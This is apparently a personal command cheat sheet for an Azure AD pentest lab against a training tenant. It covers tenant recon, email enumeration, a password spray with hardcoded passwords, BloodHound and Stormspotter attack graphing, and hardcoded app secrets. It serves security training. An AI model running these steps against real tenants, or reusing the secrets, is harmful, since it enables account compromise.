Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1 -Verbose

$domain = "defcorphq.onmicrosoft.com"
$User = "root"
$base = "defcorphq"

# Get Login Info
Get-AADIntLoginInformation -UserName $User

# Get Tenant ID
Get-AADIntTenantId -Domain $domain
# 2d50cb29-5f7b-48a4-87ce-fe75a941adb6


# Get Tenant Domains
Get-AADIntTenantDomains -Domain $domain

# Run o365creeper
C:\Python27\python.exe C:\AzAD\Tools\o365creeper\o365creeper.py -f C:\AzAD\Tools\emails.txt -o validemails.txt
# valid was admin and test

# Run Microburst
Import-Module C:\AzAD\Tools\MicroBurst\MicroBurst.psm1 -Verbose
Invoke-EnumerateAzureSubDomains -Base $base -Verbose
# uses email, SharePoint, and Hosted Domain
Invoke-EnumerateAzureBlobs -Base $base -Permutations "thisfile.txt"

# use MSOLSpray to do a password spray
C:\AzAD\Tools\MSOLSpray\MSOLSpray.ps1 -UserList .\validemails.txt -Password SuperVeryEasytoGuessPAssw0rd!@222 -VErbose #"SuperVeryEasytoGuessPAssw0rd!@111" -Verbose

# Use AzureHound
Import-Module AzureHound.ps1
Invoke-AzureHound -Verbose
# should make the zip file for import into neo4j
.\neo4j.bat console
BloodHound.exe
# Now import the zip file you just got!
# grab this if you want the custom queries installed for Azure: https://github.com/hausec/Bloodhound-Custom-Queries
# Another cheatsheet: https://hausec.com/2020/11/23/azurehound-cypher-cheatsheet/

# Use Stormspotter
# https://github.com/AzureStormspotter
# published by microsoft for creating attack graphs
# Don't run in ISE!
cd C:\AzAD\Tools\stormspotter\backend
pipenv shell
python ssbackend.pyz
# start the front-end in a shell that is not an ISE
cd C:\AzAD\Tools\stormspotter\frontend\dist\spa
quasar.cmd serve -p 9001 --history
# Collect the data
cd C:\AzAD\Tools\stormspotter\stormcollector\
pipenv shell
# login with your creds
az login -u $User -p $Pass
python C:\AzAD\Tools\stormspotter\stormcollector\sscollector.pyz cli
# Now go to https://localhost:9001


$appid="999ac582-fe8d-4d83-9d72-5500fa386f74"
$secret="73be6412-53f6-4dcd-b2f6-e71aeb4f2dee"
$value="-h47Q~hY6v74O4yi_G55FWSXhu~0rWnkMDyoM"

az storage account list --query [?allowBlobPublicAccess=='True'].name